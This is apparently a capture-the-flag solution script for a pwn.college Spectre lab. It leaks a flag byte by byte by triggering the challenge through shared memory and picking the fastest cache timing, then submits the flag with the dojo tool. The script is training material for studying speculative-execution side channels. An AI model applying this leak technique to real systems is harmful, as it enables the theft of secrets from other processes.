#!/nix/store/cdaifv92znxy5ai4sawricjl0p5b9sgf-python3-3.13.11/bin/python3.13
# Microarchitecture Exploitation - Baby Spectre 1
# https://pwn.college/system-security/speculative-execution/babyarch-parseonepage
import ctypes
import os
import site
import subprocess
import sys
import time

# make pwn package available
site.addsitedir(
    "/nix/store/8rkdh1mj5w4ysz03j9n5xcdamcwrdwjd-python3-3.13.11-env/lib/python3.13/site-packages"
)
import pwn
from dojotool import find_challenge, tee


def inside_challenge() -> None:
    SHM = 0x1337000
    index = ctypes.c_int.from_address(SHM + 32)
    timings = (ctypes.c_uint64 * 256).from_address(SHM + 0x1000)
    sem_post = ctypes.CDLL(None).sem_post

    flag = bytearray()
    for pos in range(64):
        index.value = pos
        sem_post(SHM)
        time.sleep(0.001)

        leaked = min(range(256), key=lambda i: timings[i])
        flag.append(leaked)
        print(f"[{pos:2d}] 0x{leaked:02x} '{chr(leaked)}'", flush=True)
        if leaked == ord("}"):
            break

    flag = flag.decode()
    print("FLAG:", flag)
    if "pwn.college" in flag:
        try:
            print(subprocess.check_output(["dojo", "submit", flag], text=True))
        except subprocess.CalledProcessError as e:
            print(e.output)

    # 让父进程退出
    sem_post(SHM)
    os._exit(0)


def ctf() -> None:
    os.chmod(__file__, 0o755)
    with pwn.process([find_challenge(), __file__], raw=True, level="error") as io:
        tee(io)
        io.recvrepeat()


if __name__ == "__main__":
    import sys

    # run with `python dojo.py flag.py anything`
    if len(sys.argv) > 1:
        ctf()
    else:
        inside_challenge()
